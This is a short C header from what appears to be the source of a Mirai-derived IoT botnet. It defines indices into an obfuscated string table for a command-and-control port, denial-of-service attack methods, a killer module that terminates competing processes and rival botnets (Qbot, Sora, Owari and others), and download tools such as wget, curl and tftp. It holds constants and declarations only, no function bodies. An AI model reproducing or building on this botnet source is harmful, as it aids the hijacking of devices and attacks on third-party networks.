#pragma once

#include <stdint.h>
#include "includes.h"

struct table_value
{
    char *val;
    uint16_t val_len;
    #ifdef DEBUG
        BOOL locked;
    #endif
};

#define TABLE_CNC_PORT 1
#define TABLE_KILLER_PROC 3
#define TABLE_KILLER_EXE 4
#define TABLE_KILLER_FD 5
#define TABLE_KILLER_TCP 6
#define TABLE_ATK_VSE 10
#define TABLE_ATK_RESOLVER 11
#define TABLE_ATK_NSERV 12
#define TABLE_KILLER_MAPS 23
#define TABLE_KILLER_ANIME 27
#define TABLE_MEM_MIRAI 28
#define TABLE_MEM_SORA 29
#define TABLE_MEM_OWARI 30
#define TABLE_MEM_JOSHO 31
#define TABLE_MEM_APOLLO 32
#define TABLE_MEM_MASUTA 33
#define TABLE_MEM_VAMP 34
#define TABLE_MEM_QBOT 35
#define TABLE_MEM_IRC 36
#define TABLE_MEM_SHINTO 37
#define TABLE_MEM_OMNI 38
#define TABLE_MISC_WGET 39
#define TABLE_MISC_CURL 40
#define TABLE_MISC_TFTP 41
#define TABLE_MISC_REBOOT 42
#define TABLE_KILLER_STAT 43
#define TABLE_KILLER_COMM 44
#define TABLE_KILLER_DEVNULL 54
#define TABLE_KILLER_BUSYBOX 55
#define TABLE_MEM_EXTRA 64
#define TABLE_MAX_KEYS 65

void table_init(void);
void table_unlock_val(uint8_t);
void table_lock_val(uint8_t);
char *table_retrieve_val(int, int *);
